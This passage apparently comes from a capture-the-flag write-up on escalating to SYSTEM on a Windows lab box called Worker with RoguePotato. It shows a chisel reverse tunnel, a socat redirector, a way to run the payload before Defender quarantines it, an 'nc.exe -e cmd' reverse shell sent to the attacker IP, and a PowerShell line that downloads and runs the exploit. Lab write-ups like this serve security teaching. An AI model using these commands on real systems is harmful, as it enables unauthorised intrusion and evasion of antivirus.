.\c client 10.10.14.24:8000 R:9999:localhost:9999
2020/08/23 13:31:41 client: Connecting to ws://10.10.14.24:8000
2020/08/23 13:31:41 client: Fingerprint 13:b9:97:ca:c7:6e:ae:5d:cd:b6:f1:bf:3c:d3:c7:ec
2020/08/23 13:31:41 client: Connected (Latency 1.0691ms)

```

The server gets the connection:

```

root@kali# ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
2020/08/23 07:27:53 server: Reverse tunnelling enabled
2020/08/23 07:27:53 server: Fingerprint 13:b9:97:ca:c7:6e:ae:5d:cd:b6:f1:bf:3c:d3:c7:ec
2020/08/23 07:27:53 server: Listening on 0.0.0.0:8000...
m2020/08/23 07:29:58 server: proxy#1:R:0.0.0.0:9999=>localhost:9999: Listening

```

Now on my Kali box there’s a listener on 9999 that will forward to 9999 on Worker.

I’ll create a `socat` listener that will forward incoming on TCP 135 to localhost 9999, which will be picked up by the `chisel` tunnel and sent back to 9999 on Worker:

```

root@kali# socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999

```

The request will look like (and the response will travel the same path in the opposite direction):

![image-20210129121730010](https://0xdfimages.gitlab.io/img/image-20210129121730010.png)

This could probably be done without `socat`, just using `chisel` to listen on 135, but I didn’t test that.

### Defender

Windows Defender will eat `RoguePotato.exe` when it’s on disk, but it turns out that if I run it fast enough, I can get it to execute before it’s detected and quarantined. I had more success running the payload as a `.bat` file.

```

c:\ProgramData>echo c:\programdata\nc.exe -e cmd 10.10.14.24 443 > rev.bat                    
                                              
c:\ProgramData>type rev.bat                             
c:\programdata\nc.exe -e cmd 10.10.14.24 443

```

I tested `rev.bat` by just running it and making sure I got a shell back.

Now I’ll make sure to run the commands to download and then execute `RoguePotato.exe` in one line.

### Success

Now I have everything in place to run RoguePotato. For speed, I’ll run one command with stacked commands to download and run it:

```

c:\ProgramData>powershell -c wget 10.10.14.24/RoguePotato.exe -outfile r.exe; .\r.exe -r 10.10.14.24 -l 9999 -e C:\programdata\rev.bat
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:104 bytes
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: C:\programdata\rev.bat
[+] RoguePotato gave you the SYSTEM powerz :D

```

Back at `nc`, I’ve got a shell as system:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.203.
Ncat: Connection from 10.10.10.203:54454.
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\ProgramData>whoami
nt authority\system

```